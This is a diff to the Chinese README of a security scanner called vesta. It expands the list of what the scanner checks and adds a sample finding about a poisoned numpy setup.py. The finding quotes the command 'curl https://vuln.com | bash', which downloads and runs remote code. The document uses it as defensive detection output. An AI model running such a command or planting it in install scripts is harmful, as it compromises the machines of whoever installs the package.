@@ -40,10 +40,20 @@ vesta同时也是一个灵活，方便的工具，能够在各种系统上运行
 
 ## 检查项
 
-`vest scan`扫描内容项
-- 已知的CVE漏洞
-- 混淆的第三方恶意包
-  <br/><br/>
+> Scan
+- 扫描通过主流安装方法安装程序的漏洞
+  - apt/apt-get
+  - rpm
+  - yum
+  - dpkg
+- 扫描软件依赖的漏洞以及恶意投毒的依赖包
+  - Java(Jar, War)
+  - NodeJs(NPM, YARN)
+  - Python(Wheel, Poetry)
+  - Golang(Go binary)
+  - PHP(Composer)
+  - Rust(Rust binary)
+
 > Docker检查
 
 | Supported | Check Item                | Description                      | Severity                 |
@@ -132,6 +142,11 @@ Detected 216 vulnerabilities
 |     |                    |                 |                  |       |          | in shallow key transformation,                                   |
 |     |                    |                 |                  |       |          | key and index lookups for                                        |
 |     |                    |                 |                  |       |          | django.contrib.postgres.f ...                                    |
++-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
+| 211 | python3.6 - numpy  | 1.24.2          |                  |   8.5 | high     | Malicious package is detected in                                 |
+|     |                    |                 |                  |       |          | '/usr/local/lib/python3.6/site-packages/numpy/setup.py',         |
+|     |                    |                 |                  |       |          | malicious command "curl https://vuln.com | bash" are             |
+|     |                    |                 |                  |       |          | detected.                                                        |
 +-----+--------------------+-----------------+------------------+-------+----------+------------------------------------------------------------------+
 
 ```
